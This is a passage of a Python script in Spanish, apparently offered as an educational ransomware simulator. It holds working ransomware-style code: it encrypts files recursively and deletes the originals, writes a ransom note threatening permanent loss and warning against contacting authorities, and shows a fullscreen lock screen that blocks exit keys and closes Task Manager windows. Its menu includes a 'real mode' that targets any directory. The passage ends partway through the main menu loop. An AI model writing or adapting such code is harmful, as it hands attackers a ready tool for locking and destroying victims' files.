#!/usr/bin/env python3
"""
🔒 SIMULADOR ÉTICO DE RANSOMWARE - VERSIÓN CON BLOQUEO TOTAL 🔒
================================================================
PROPÓSITO: Herramienta educativa para demostrar cómo funciona el ransomware
ADVERTENCIA: Solo para fines educativos en entornos controlados (MÁQUINAS VIRTUALES)

Características:
- ✅ Entorno de prueba aislado y seguro
- ✅ Auto-instalación de dependencias
- ✅ Cifrado AES-256 con fallback a XOR
- ✅ Pantalla de bloqueo a pantalla completa
- ✅ Alt+F4, Ctrl+Alt+Del y Escape bloqueados
- ✅ Solo se desbloquea con clave correcta
- ✅ Visualización hex/ASCII de datos
- ✅ Interfaz colorida y clara
- ✅ Operaciones reversibles (cifrar/descifrar)
"""

import os
import sys
import subprocess
import base64
import secrets
import threading
import time
from pathlib import Path

# ============================================================================
# INSTALACIÓN AUTOMÁTICA DE DEPENDENCIAS
# ============================================================================

def instalar_dependencia(paquete):
    """Instala un paquete de Python si no está disponible"""
    print(f"📦 Instalando {paquete}...")
    try:
        subprocess.check_call([sys.executable, "-m", "pip", "install", paquete, "-q"])
        print(f"✅ {paquete} instalado correctamente")
        return True
    except:
        print(f"❌ Error instalando {paquete}")
        return False

# Intentar importar cryptography, si falla, instalarla
try:
    from cryptography.fernet import Fernet
    from cryptography.hazmat.primitives import hashes
    from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC
    from cryptography.hazmat.backends import default_backend
    CRYPTO_DISPONIBLE = True
except ImportError:
    print("⚠️  Librería 'cryptography' no encontrada")
    if instalar_dependencia("cryptography"):
        from cryptography.fernet import Fernet
        from cryptography.hazmat.primitives import hashes
        from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC
        from cryptography.hazmat.backends import default_backend
        CRYPTO_DISPONIBLE = True
    else:
        print("⚠️  Usando cifrado XOR como alternativa")
        CRYPTO_DISPONIBLE = False

# Intentar importar dependencias para pantalla de bloqueo
try:
    import tkinter as tk
    TKINTER_DISPONIBLE = True
except ImportError:
    print("⚠️  Tkinter no está disponible")
    TKINTER_DISPONIBLE = False

try:
    import pyautogui
    import pygetwindow as gw
    PYAUTOGUI_DISPONIBLE = True
except ImportError:
    print("⚠️  Instalando pyautogui y pygetwindow...")
    if instalar_dependencia("pyautogui") and instalar_dependencia("pygetwindow"):
        import pyautogui
        import pygetwindow as gw
        PYAUTOGUI_DISPONIBLE = True
    else:
        print("⚠️  Pantalla de bloqueo limitada (sin pyautogui)")
        PYAUTOGUI_DISPONIBLE = False

# ============================================================================
# CONFIGURACIÓN
# ============================================================================

# Detectar sistema operativo
import platform
SISTEMA = platform.system()  # 'Windows', 'Linux', 'Darwin' (macOS)

# Habilitar colores ANSI en Windows
if SISTEMA == 'Windows':
    try:
        import ctypes
        kernel32 = ctypes.windll.kernel32
        kernel32.SetConsoleMode(kernel32.GetStdHandle(-11), 7)
    except:
        pass  # Si falla, los colores no funcionarán pero el programa sí

# El directorio se creará automáticamente en el mismo lugar que el script
NOMBRE_DIRECTORIO_PRUEBA = "archivos_prueba_ransomware"

# Directorios típicos de usuario por sistema operativo
def obtener_directorios_usuario():
    """Retorna directorios comunes del usuario según el SO"""
    home = Path.home()
    
    if SISTEMA == 'Windows':
        return {
            'documentos': home / 'Documents',
            'escritorio': home / 'Desktop',
            'descargas': home / 'Downloads',
            'imagenes': home / 'Pictures',
            'musica': home / 'Music',
            'videos': home / 'Videos',
        }
    elif SISTEMA == 'Darwin':  # macOS
        return {
            'documentos': home / 'Documents',
            'escritorio': home / 'Desktop',
            'descargas': home / 'Downloads',
            'imagenes': home / 'Pictures',
            'musica': home / 'Music',
            'videos': home / 'Movies',
        }
    else:  # Linux
        return {
            'documentos': home / 'Documentos' if (home / 'Documentos').exists() else home / 'Documents',
            'escritorio': home / 'Escritorio' if (home / 'Escritorio').exists() else home / 'Desktop',
            'descargas': home / 'Descargas' if (home / 'Descargas').exists() else home / 'Downloads',
            'imagenes': home / 'Imágenes' if (home / 'Imágenes').exists() else home / 'Pictures',
            'musica': home / 'Música' if (home / 'Música').exists() else home / 'Music',
            'videos': home / 'Vídeos' if (home / 'Vídeos').exists() else home / 'Videos',
        }

# Colores para la terminal (funcionan en Windows 10+, macOS, Linux)
class Color:
    ROJO = '\033[91m'
    VERDE = '\033[92m'
    AMARILLO = '\033[93m'
    AZUL = '\033[94m'
    MAGENTA = '\033[95m'
    CYAN = '\033[96m'
    BLANCO = '\033[97m'
    RESET = '\033[0m'
    BOLD = '\033[1m'

# ============================================================================
# SISTEMA DE ALERTA A PANTALLA COMPLETA
# ============================================================================

class PantallaBloqueo:
    """Crea una ventana de alerta a pantalla completa que bloquea el sistema"""
    
    def __init__(self, clave_descifrado):
        self.clave_correcta = clave_descifrado
        self.bloqueado = True
        self.intentos = 0
        self.max_intentos = 3
        self.segundos = 0
        
    def crear_alerta_pantalla_completa(self):
        """Crea una ventana a pantalla completa que no se puede cerrar"""
        
        if not TKINTER_DISPONIBLE:
            print(f"{Color.ROJO}❌ Tkinter no disponible. No se puede crear pantalla de bloqueo.{Color.RESET}")
            return
        
        try:
            # Configurar pyautogui si está disponible
            if PYAUTOGUI_DISPONIBLE:
                pyautogui.FAILSAFE = False
        except:
            pass
        
        # Crear ventana principal
        self.root = tk.Tk()
        self.root.title("⚠️ SISTEMA BLOQUEADO ⚠️")
        
        # Obtener dimensiones de la pantalla
        screen_width = self.root.winfo_screenwidth()
        screen_height = self.root.winfo_screenheight()
        
        # Configurar ventana a pantalla completa
        self.root.attributes('-fullscreen', True)
        self.root.attributes('-topmost', True)  # Siempre encima
        self.root.configure(bg='black')
        
        # Deshabilitar teclas de escape
        self.root.protocol("WM_DELETE_WINDOW", self.nada)  # Ignorar cierre
        self.root.bind("<Alt-F4>", self.nada)  # Bloquear Alt+F4
        self.root.bind("<Control-Alt-Delete>", self.nada)  # Bloquear Ctrl+Alt+Del
        self.root.bind("<Escape>", self.nada)  # Bloquear Escape
        self.root.bind("<Alt-Tab>", self.nada)  # Bloquear Alt+Tab
        self.root.bind("<Windows>", self.nada)  # Bloquear tecla Windows
        
        # Crear frame central
        frame = tk.Frame(self.root, bg='black')
        frame.place(relx=0.5, rely=0.5, anchor='center')
        
        # Título principal
        tk.Label(frame, text="⚠️ ¡¡¡ SISTEMA BLOQUEADO !!! ⚠️", 
                font=("Arial", 48, "bold"), 
                fg="red", 
                bg="black").pack(pady=20)
        
        # Subtítulo
        tk.Label(frame, text="TODOS TUS ARCHIVOS HAN SIDO CIFRADOS CON ALGORITMO MILITAR AES-256", 
                font=("Arial", 20), 
                fg="white", 
                bg="black").pack(pady=10)
        
        # Separador
        tk.Label(frame, text="━" * 80, 
                font=("Arial", 12), 
                fg="yellow", 
                bg="black").pack(pady=20)
        
        # Instrucciones
        tk.Label(frame, text="PARA RECUPERAR EL ACCESO A TU SISTEMA:", 
                font=("Arial", 22, "bold"), 
                fg="yellow", 
                bg="black").pack(pady=10)
        
        tk.Label(frame, text="1. Encuentra el archivo 'CLAVE_DE_RESCATE.key' en tu sistema\n" +
                           "2. Copia el contenido de la clave\n" +
                           "3. Pégalo en el campo de abajo\n" +
                           "4. Presiona 'DESBLOQUEAR SISTEMA'",
                font=("Arial", 16), 
                fg="white", 
                bg="black",
                justify="left").pack(pady=20)
        
        # Campo para ingresar clave
        tk.Label(frame, text="CLAVE DE DESCIFRADO:", 
                font=("Arial", 18, "bold"), 
                fg="white", 
                bg="black").pack(pady=10)
        
        self.entry_clave = tk.Entry(frame, 
                                   font=("Courier New", 18), 
                                   show="*", 
                                   width=60, 
                                   bg="#111", 
                                   fg="lime",
                                   insertbackground="lime",
                                   relief="solid",
                                   borderwidth=2)
        self.entry_clave.pack(pady=10)
        self.entry_clave.focus_set()  # Poner foco en el campo
        
        # Frame para botones
        frame_botones = tk.Frame(frame, bg='black')
        frame_botones.pack(pady=20)
        
        # Botón para verificar clave
        tk.Button(frame_botones, 
                 text="🔓 DESBLOQUEAR SISTEMA", 
                 font=("Arial", 20, "bold"), 
                 bg="red", 
                 fg="white",
                 padx=30,
                 pady=10,
                 command=self.verificar_clave).pack(side="left", padx=10)
        
        # Botón para mostrar/ocultar clave
        tk.Button(frame_botones, 
                 text="👁️ MOSTRAR CLAVE", 
                 font=("Arial", 14), 
                 bg="#333", 
                 fg="white",
                 command=self.alternar_mostrar_clave).pack(side="left", padx=10)
        
        # Contador de intentos
        self.label_intentos = tk.Label(frame, 
                                      text=f"INTENTOS RESTANTES: {self.max_intentos - self.intentos}", 
                                      font=("Arial", 16, "bold"), 
                                      fg="white", 
                                      bg="black")
        self.label_intentos.pack(pady=10)
        
        # Timer
        self.label_timer = tk.Label(frame, 
                                   text="⏱️  TIEMPO BLOQUEADO: 00:00:00", 
                                   font=("Arial", 16), 
                                   fg="white", 
                                   bg="black")
        self.label_timer.pack(pady=10)
        
        # Mensaje de advertencia
        tk.Label(frame, 
                text="⚠️  ADVERTENCIA: No intentes reiniciar o apagar el sistema. Podrías perder tus archivos permanentemente.",
                font=("Arial", 14), 
                fg="orange", 
                bg="black",
                wraplength=800).pack(pady=20)
        
        # Nota educativa
        tk.Label(frame, 
                text="💡 ESTO ES UNA SIMULACIÓN EDUCATIVA - No pagues rescates reales a ciberdelincuentes",
                font=("Arial", 12), 
                fg="cyan", 
                bg="black",
                wraplength=800).pack(pady=10)
        
        # Iniciar timer
        self.iniciar_timer()
        
        # Iniciar hilo de bloqueo continuo
        self.mantener_bloqueo()
        
        # Hacer que la ventana capture todos los eventos de teclado
        self.root.bind_all("<Key>", self.capturar_teclas)
        
        self.root.mainloop()
    
    def nada(self, event=None):
        """Función que no hace nada (para bloquear teclas)"""
        return "break"
    
    def capturar_teclas(self, event):
        """Captura combinaciones de teclas peligrosas"""
        teclas_peligrosas = ['F4', 'Delete', 'Escape', 'LWin', 'Tab']
        if event.keysym in teclas_peligrosas and (event.state & 0x4 or event.state & 0x8):  # Ctrl o Alt presionado
            return "break"
    
    def alternar_mostrar_clave(self):
        """Alterna entre mostrar u ocultar la clave"""
        if self.entry_clave.cget('show') == '*':
            self.entry_clave.config(show='')
        else:
            self.entry_clave.config(show='*')
    
    def iniciar_timer(self):
        """Inicia un contador de tiempo"""
        self.actualizar_timer()
    
    def actualizar_timer(self):
        """Actualiza el timer cada segundo"""
        if self.bloqueado:
            self.segundos += 1
            horas = self.segundos // 3600
            minutos = (self.segundos % 3600) // 60
            segundos = self.segundos % 60
            self.label_timer.config(text=f"⏱️  TIEMPO BLOQUEADO: {horas:02d}:{minutos:02d}:{segundos:02d}")
            self.root.after(1000, self.actualizar_timer)
    
    def verificar_clave(self):
        """Verifica si la clave ingresada es correcta"""
        clave_ingresada = self.entry_clave.get().strip()
        
        # Convertir clave a bytes si es string
        if isinstance(self.clave_correcta, bytes):
            try:
                # Intentar decodificar si es base64
                if isinstance(clave_ingresada, str):
                    try:
                        clave_bytes = base64.urlsafe_b64decode(clave_ingresada)
                    except:
                        # Si no es base64, usar como string normal
                        clave_bytes = clave_ingresada.encode()
            except:
                clave_bytes = b''
        else:
            clave_bytes = self.clave_correcta
        
        # Verificar la clave
        if clave_ingresada == self.clave_correcta or clave_bytes == self.clave_correcta:
            # Clave correcta
            self.bloqueado = False
            self.root.destroy()
            self.mostrar_mensaje_exito()
        else:
            # Clave incorrecta
            self.intentos += 1
            intentos_restantes = max(0, self.max_intentos - self.intentos)
            self.label_intentos.config(text=f"INTENTOS RESTANTES: {intentos_restantes}")
            
            if self.intentos >= self.max_intentos:
                # Bloquear permanentemente después de max intentos
                self.entry_clave.config(state='disabled', bg="#330000")
                tk.Label(self.root, 
                        text="❌ DEMASIADOS INTENTOS FALLIDOS. SISTEMA BLOQUEADO PERMANENTEMENTE",
                        font=("Arial", 24, "bold"),
                        fg="red",
                        bg="black").pack(pady=50)
                
                # Mostrar clave correcta (solo en modo educativo)
                tk.Label(self.root, 
                        text=f"Clave correcta (solo educativo): {self.clave_correcta[:50]}...",
                        font=("Arial", 12),
                        fg="yellow",
                        bg="black").pack(pady=10)
            else:
                # Mostrar mensaje de error
                self.entry_clave.delete(0, tk.END)
                self.entry_clave.config(bg="#330000")
                self.root.after(300, lambda: self.entry_clave.config(bg="#111"))
    
    def mostrar_mensaje_exito(self):
        """Muestra mensaje de éxito al desbloquear"""
        if not TKINTER_DISPONIBLE:
            print(f"{Color.VERDE}✅ Sistema desbloqueado correctamente{Color.RESET}")
            return
            
        win = tk.Tk()
        win.title("✅ Sistema Desbloqueado")
        win.geometry("800x400")
        win.configure(bg='green')
        win.attributes('-topmost', True)
        
        tk.Label(win, 
                text="✅ ¡SISTEMA DESBLOQUEADO CORRECTAMENTE!",
                font=("Arial", 28, "bold"),
                fg="white",
                bg="green").pack(pady=50)
        
        tk.Label(win, 
                text="Todos tus archivos han sido recuperados automáticamente.\n" +
                     "El sistema volverá a la normalidad en 5 segundos.",
                font=("Arial", 18),
                fg="white",
                bg="green").pack(pady=20)
        
        tk.Label(win, 
                text="💡 Lección aprendida: Mantén siempre copias de seguridad de tus datos",
                font=("Arial", 14),
                fg="lightyellow",
                bg="green").pack(pady=20)
        
        # Cerrar automáticamente después de 5 segundos
        win.after(5000, win.destroy)
        
        win.mainloop()
    
    def mantener_bloqueo(self):
        """Función que se ejecuta en un hilo para mantener el bloqueo"""
        def bloqueo_continuo():
            while self.bloqueado:
                try:
                    if PYAUTOGUI_DISPONIBLE:
                        # Intentar mantener el foco en la ventana
                        pyautogui.press('f11')
                        
                        # Cerrar ventanas del administrador de tareas
                        for window in gw.getAllWindows():
                            if window.title:
                                title_lower = window.title.lower()
                                if any(word in title_lower for word in ['task', 'manager', 'tarea', 'administrador']):
                                    try:
                                        window.close()
                                    except:
                                        pass
                except:
                    pass
                
                time.sleep(0.5)
        
        # Iniciar en un hilo separado
        if PYAUTOGUI_DISPONIBLE:
            thread = threading.Thread(target=bloqueo_continuo, daemon=True)
            thread.start()

# ============================================================================
# FUNCIONES DE CIFRADO
# ============================================================================

class CifradorAES:
    """Cifrador usando AES-256 a través de Fernet"""
    
    @staticmethod
    def generar_clave(password=None):
        if password is None:
            password = secrets.token_bytes(32)
        else:
            password = password.encode() if isinstance(password, str) else password
        
        salt = secrets.token_bytes(16)
        kdf = PBKDF2HMAC(
            algorithm=hashes.SHA256(),
            length=32,
            salt=salt,
            iterations=480000,  # Iteraciones recomendadas OWASP 2023
            backend=default_backend()
        )
        key = base64.urlsafe_b64encode(kdf.derive(password))
        return key, salt
    
    @staticmethod
    def cifrar_datos(clave, datos):
        f = Fernet(clave)
        return f.encrypt(datos)
    
    @staticmethod
    def descifrar_datos(clave, datos_cifrados):
        f = Fernet(clave)
        return f.decrypt(datos_cifrados)


class CifradorXOR:
    """Cifrador simple usando XOR (fallback si AES no está disponible)"""
    
    @staticmethod
    def generar_clave():
        clave = secrets.token_bytes(32)
        return base64.b64encode(clave), None
    
    @staticmethod
    def cifrar_datos(clave, datos):
        clave_bytes = base64.b64decode(clave)
        resultado = bytearray()
        for i, byte in enumerate(datos):
            resultado.append(byte ^ clave_bytes[i % len(clave_bytes)])
        return bytes(resultado)
    
    @staticmethod
    def descifrar_datos(clave, datos_cifrados):
        # XOR es simétrico, cifrar y descifrar es la misma operación
        return CifradorXOR.cifrar_datos(clave, datos_cifrados)


# ============================================================================
# FUNCIONES DE VISUALIZACIÓN
# ============================================================================

def mostrar_hex_ascii(datos, max_bytes=128):
    """Muestra los datos en formato hex y ASCII"""
    print(f"\n{Color.CYAN}{'='*70}{Color.RESET}")
    print(f"{Color.BOLD}Visualización Hex/ASCII:{Color.RESET}")
    print(f"{Color.CYAN}{'='*70}{Color.RESET}")
    
    datos_mostrar = datos[:max_bytes]
    
    for i in range(0, len(datos_mostrar), 16):
        chunk = datos_mostrar[i:i+16]
        
        # Offset
        hex_offset = f"{i:08x}"
        
        # Bytes en hexadecimal
        hex_parte = ' '.join(f"{b:02x}" for b in chunk)
        hex_parte = hex_parte.ljust(48)  # 16 bytes * 3 chars
        
        # Representación ASCII
        ascii_parte = ''.join(chr(b) if 32 <= b <= 126 else '.' for b in chunk)
        
        print(f"{Color.AMARILLO}{hex_offset}{Color.RESET}  {Color.VERDE}{hex_parte}{Color.RESET}  {Color.MAGENTA}{ascii_parte}{Color.RESET}")
    
    if len(datos) > max_bytes:
        print(f"\n{Color.AMARILLO}... ({len(datos) - max_bytes} bytes más){Color.RESET}")
    
    print(f"{Color.CYAN}{'='*70}{Color.RESET}\n")


def imprimir_banner():
    """Muestra el banner del simulador"""
    print(f"\n{Color.ROJO}{Color.BOLD}")
    print("╔══════════════════════════════════════════════════════════════════════════╗")
    print("║          🔒 SIMULADOR ÉTICO DE RANSOMWARE CON BLOQUEO TOTAL 🔒          ║")
    print("║                       Versión Educativa 3.0                              ║")
    print("╚══════════════════════════════════════════════════════════════════════════╝")
    print(f"{Color.RESET}")
    print(f"{Color.AMARILLO}⚠️  PROPÓSITO: Solo para fines educativos en MÁQUINAS VIRTUALES{Color.RESET}")
    print(f"{Color.VERDE}✅ Modo: {'AES-256' if CRYPTO_DISPONIBLE else 'XOR Simple'}{Color.RESET}")
    print(f"{Color.CYAN}🎯 Pantalla de bloqueo: {'Disponible' if TKINTER_DISPONIBLE else 'No disponible'}{Color.RESET}\n")


# ============================================================================
# FUNCIONES PRINCIPALES
# ============================================================================

def crear_entorno_prueba(directorio):
    """Crea un directorio de prueba con archivos de ejemplo"""
    print(f"{Color.AZUL}📁 Creando entorno de prueba...{Color.RESET}")
    
    # Crear directorio principal
    Path(directorio).mkdir(exist_ok=True)
    
    # Crear algunos archivos de prueba
    archivos_prueba = {
        "documento_importante.txt": "Este es un documento muy importante.\nContiene información confidencial.\n¡No lo pierdas!",
        "datos_secretos.txt": "Usuario: admin\nContraseña: super_secreto_123\nAPI Key: sk-1234567890abcdef",
        "notas.txt": "Recordatorio:\n- Comprar leche\n- Llamar al dentista\n- Backup de datos",
        "subcarpeta/archivo_anidado.txt": "Este archivo está en una subcarpeta\npara probar el escaneo recursivo.",
    }
    
    for nombre_archivo, contenido in archivos_prueba.items():
        ruta_archivo = Path(directorio) / nombre_archivo
        ruta_archivo.parent.mkdir(parents=True, exist_ok=True)
        ruta_archivo.write_text(contenido, encoding='utf-8')
    
    # Crear un archivo binario de ejemplo (imagen pequeña)
    imagen_path = Path(directorio) / "imagen_test.png"
    # PNG mínima válida (1x1 pixel transparente)
    png_data = bytes([
        0x89, 0x50, 0x4E, 0x47, 0x0D, 0x0A, 0x1A, 0x0A,
        0x00, 0x00, 0x00, 0x0D, 0x49, 0x48, 0x44, 0x52,
        0x00, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 0x01,
        0x08, 0x06, 0x00, 0x00, 0x00, 0x1F, 0x15, 0xC4,
        0x89, 0x00, 0x00, 0x00, 0x0A, 0x49, 0x44, 0x41,
        0x54, 0x78, 0x9C, 0x63, 0x00, 0x01, 0x00, 0x00,
        0x05, 0x00, 0x01, 0x0D, 0x0A, 0x2D, 0xB4, 0x00,
        0x00, 0x00, 0x00, 0x49, 0x45, 0x4E, 0x44, 0xAE,
        0x42, 0x60, 0x82
    ])
    imagen_path.write_bytes(png_data)
    
    print(f"{Color.VERDE}✅ Entorno de prueba creado en: {directorio}{Color.RESET}")
    print(f"{Color.VERDE}   Se crearon {len(archivos_prueba) + 1} archivos de prueba{Color.RESET}\n")


def cifrar_archivo(cifrador, clave, ruta_archivo, mostrar_preview=True):
    """Cifra un archivo individual"""
    try:
        # Leer el archivo original
        with open(ruta_archivo, 'rb') as f:
            datos_originales = f.read()
        
        if mostrar_preview and len(datos_originales) > 0:
            print(f"\n{Color.AZUL}📄 Archivo: {ruta_archivo.name}{Color.RESET}")
            print(f"{Color.AMARILLO}Datos ORIGINALES:{Color.RESET}")
            mostrar_hex_ascii(datos_originales)
        
        # Cifrar los datos
        datos_cifrados = cifrador.cifrar_datos(clave, datos_originales)
        
        if mostrar_preview:
            print(f"{Color.ROJO}Datos CIFRADOS:{Color.RESET}")
            mostrar_hex_ascii(datos_cifrados)
        
        # Guardar el archivo cifrado con extensión .encrypted
        ruta_cifrada = Path(str(ruta_archivo) + '.encrypted')
        with open(ruta_cifrada, 'wb') as f:
            f.write(datos_cifrados)
        
        # Eliminar el archivo original (simular ransomware)
        os.remove(ruta_archivo)
        
        return True
    
    except Exception as e:
        print(f"{Color.ROJO}❌ Error cifrando {ruta_archivo}: {e}{Color.RESET}")
        return False


def descifrar_archivo(cifrador, clave, ruta_archivo_cifrado):
    """Descifra un archivo individual"""
    try:
        # Leer el archivo cifrado
        with open(ruta_archivo_cifrado, 'rb') as f:
            datos_cifrados = f.read()
        
        # Descifrar los datos
        datos_descifrados = cifrador.descifrar_datos(clave, datos_cifrados)
        
        # Restaurar el archivo original
        ruta_original = Path(str(ruta_archivo_cifrado).replace('.encrypted', ''))
        with open(ruta_original, 'wb') as f:
            f.write(datos_descifrados)
        
        # Eliminar el archivo cifrado
        os.remove(ruta_archivo_cifrado)
        
        return True
    
    except Exception as e:
        print(f"{Color.ROJO}❌ Error descifrando {ruta_archivo_cifrado}: {e}{Color.RESET}")
        return False


def cifrar_directorio(cifrador, clave, directorio, activar_bloqueo=False):
    """Cifra todos los archivos en un directorio recursivamente"""
    archivos_cifrados = 0
    
    print(f"{Color.ROJO}{Color.BOLD}🔒 Iniciando cifrado de archivos...{Color.RESET}\n")
    
    for root, dirs, files in os.walk(directorio):
        for archivo in files:
            if archivo.endswith('.encrypted') or archivo == 'RANSOM_NOTE.txt':
                continue
            
            ruta_archivo = Path(root) / archivo
            
            # Mostrar preview solo para el primer archivo
            mostrar_preview = (archivos_cifrados == 0)
            
            if cifrar_archivo(cifrador, clave, ruta_archivo, mostrar_preview):
                archivos_cifrados += 1
                if not mostrar_preview:
                    print(f"{Color.VERDE}✅ Cifrado: {ruta_archivo.name}{Color.RESET}")
    
    print(f"\n{Color.VERDE}{Color.BOLD}✅ Total de archivos cifrados: {archivos_cifrados}{Color.RESET}\n")
    
    # Activar pantalla de bloqueo si se solicita
    if activar_bloqueo and archivos_cifrados > 0:
        print(f"{Color.ROJO}{Color.BOLD}🚨 ACTIVANDO PANTALLA DE BLOQUEO...{Color.RESET}")
        print(f"{Color.AMARILLO}El sistema se bloqueará en 5 segundos...{Color.RESET}")
        time.sleep(5)
        
        # Crear y mostrar pantalla de bloqueo
        if TKINTER_DISPONIBLE:
            print(f"{Color.ROJO}🔒 Pantalla de bloqueo ACTIVADA{Color.RESET}")
            print(f"{Color.VERDE}💾 Clave guardada en: CLAVE_DE_RESCATE.key{Color.RESET}")
            print(f"{Color.AMARILLO}⚠️  Ingresa la clave para desbloquear el sistema{Color.RESET}")
            
            bloqueo = PantallaBloqueo(clave)
            bloqueo_thread = threading.Thread(target=bloqueo.crear_alerta_pantalla_completa, daemon=False)
            bloqueo_thread.start()
        else:
            print(f"{Color.ROJO}❌ No se puede activar pantalla de bloqueo (Tkinter no disponible){Color.RESET}")
    
    return archivos_cifrados


def descifrar_directorio(cifrador, clave, directorio):
    """Descifra todos los archivos .encrypted en un directorio"""
    archivos_descifrados = 0
    
    print(f"{Color.VERDE}{Color.BOLD}🔓 Iniciando descifrado de archivos...{Color.RESET}\n")
    
    for root, dirs, files in os.walk(directorio):
        for archivo in files:
            if archivo.endswith('.encrypted'):
                ruta_archivo = Path(root) / archivo
                if descifrar_archivo(cifrador, clave, ruta_archivo):
                    archivos_descifrados += 1
                    print(f"{Color.VERDE}✅ Descifrado: {archivo}{Color.RESET}")
    
    print(f"\n{Color.VERDE}{Color.BOLD}✅ Total de archivos descifrados: {archivos_descifrados}{Color.RESET}\n")
    return archivos_descifrados


def crear_nota_rescate(directorio, clave):
    """Crea la nota de rescate"""
    clave_str = clave.decode('utf-8') if isinstance(clave, bytes) else str(clave)
    
    nota = f"""
╔══════════════════════════════════════════════════════════════════════════╗
║                     ⚠️  ATENCIÓN - SISTEMA BLOQUEADO ⚠️                 ║
║                                                                          ║
║         TUS ARCHIVOS HAN SIDO CIFRADOS CON ALGORITMO MILITAR            ║
║                                                                          ║
╚══════════════════════════════════════════════════════════════════════════╝

🔐 ¿QUÉ PASÓ?
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
Todos tus archivos importantes han sido cifrados con cifrado AES-256.
No podrás acceder a ellos sin la clave de descifrado.

💰 ¿CÓMO RECUPERAR MIS ARCHIVOS?
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
Para recuperar tus archivos, necesitas la clave de descifrado.
La clave se encuentra en el archivo 'CLAVE_DE_RESCATE.key' en tu sistema.

CLAVE DE DESCIFRADO: {clave_str[:50]}...

⏰ TIEMPO LÍMITE
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
Tienes 72 horas para ingresar la clave. Después de ese tiempo, los archivos
se perderán permanentemente.

⚠️  NO INTENTES:
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
• Reiniciar o apagar el sistema
• Usar software de recuperación
• Contactar a autoridades
• Modificar los archivos cifrados

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

🔑 INSTRUCCIONES DE RECUPERACIÓN:
1. Encuentra el archivo 'CLAVE_DE_RESCATE.key'
2. Copia la clave completa
3. Ingresa la clave en la pantalla de bloqueo
4. Presiona 'DESBLOQUEAR SISTEMA'

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

🎓 ESTO ES UNA SIMULACIÓN EDUCATIVA
   Siempre mantén copias de seguridad de tus datos importantes.
   Nunca pagues rescates a ciberdelincuentes reales.

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
"""
    
    ruta_nota = Path(directorio) / 'RANSOM_NOTE.txt'
    ruta_nota.write_text(nota, encoding='utf-8')
    print(f"{Color.ROJO}📝 Nota de rescate creada: {ruta_nota}{Color.RESET}\n")


def guardar_clave(clave, ruta='clave_descifrado.key'):
    """Guarda la clave de descifrado"""
    with open(ruta, 'wb') as f:
        if isinstance(clave, bytes):
            f.write(clave)
        else:
            f.write(clave.encode('utf-8'))
    print(f"{Color.VERDE}💾 Clave guardada en: {ruta}{Color.RESET}\n")


def cargar_clave(ruta='clave_descifrado.key'):
    """Carga la clave de descifrado"""
    try:
        with open(ruta, 'rb') as f:
            return f.read()
    except FileNotFoundError:
        print(f"{Color.ROJO}❌ No se encontró el archivo de clave: {ruta}{Color.RESET}")
        return None


# ============================================================================
# MENÚ PRINCIPAL
# ============================================================================

def mostrar_menu():
    """Muestra el menú de opciones"""
    print(f"{Color.CYAN}{Color.BOLD}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━{Color.RESET}")
    print(f"{Color.CYAN}{Color.BOLD}MENÚ PRINCIPAL - SIMULADOR DE RANSOMWARE{Color.RESET}")
    print(f"{Color.CYAN}{Color.BOLD}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━{Color.RESET}")
    print(f"{Color.AMARILLO}1.{Color.RESET} Crear entorno de prueba")
    print(f"{Color.ROJO}2.{Color.RESET} Cifrar archivos (entorno de prueba)")
    print(f"{Color.VERDE}3.{Color.RESET} Descifrar archivos (recuperar)")
    print(f"{Color.AZUL}4.{Color.RESET} Ver nota de rescate")
    print(f"{Color.MAGENTA}5.{Color.RESET} Información del sistema")
    print(f"{Color.ROJO}{Color.BOLD}6.{Color.RESET} {Color.ROJO}⚠️  MODO REAL - Cifrar directorio personalizado{Color.RESET}")
    print(f"{Color.ROJO}{Color.BOLD}8.{Color.RESET} {Color.ROJO}🚨 MODO BLOQUEO TOTAL - Cifrar y bloquear sistema{Color.RESET}")
    print(f"{Color.VERDE}{Color.BOLD}7.{Color.RESET} {Color.VERDE}🔓 Descifrar directorio personalizado{Color.RESET}")
    print(f"{Color.BLANCO}0.{Color.RESET} Salir")
    print(f"{Color.CYAN}{Color.BOLD}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━{Color.RESET}\n")


def main():
    """Función principal"""
    imprimir_banner()
    
    # Configurar el directorio de prueba
    script_dir = Path(__file__).parent.absolute()
    directorio_prueba = script_dir / NOMBRE_DIRECTORIO_PRUEBA
    
    # Seleccionar el cifrador
    cifrador = CifradorAES if CRYPTO_DISPONIBLE else CifradorXOR
    
    while True:
        mostrar_menu()
        opcion = input(f"{Color.BOLD}Selecciona una opción: {Color.RESET}").strip()
        print()
        
        if opcion == '1':
            crear_entorno_prueba(directorio_prueba)
            
        elif opcion == '2':
            if not directorio_prueba.exists():
                print(f"{Color.ROJO}❌ Primero crea el entorno de prueba (opción 1){Color.RESET}\n")
                continue
            
            print(f"{Color.AMARILLO}⚠️  ¿Estás seguro de cifrar los archivos?{Color.RESET}")
            confirmar = input(f"{Color.BOLD}Escribe 'SI' para confirmar: {Color.RESET}").strip()
            
            if confirmar.upper() == 'SI':
                clave, salt = cifrador.generar_clave()
                archivos_cifrados = cifrar_directorio(cifrador, clave, directorio_prueba)
                
                if archivos_cifrados > 0:
                    crear_nota_rescate(directorio_prueba, clave)
                    guardar_clave(clave)
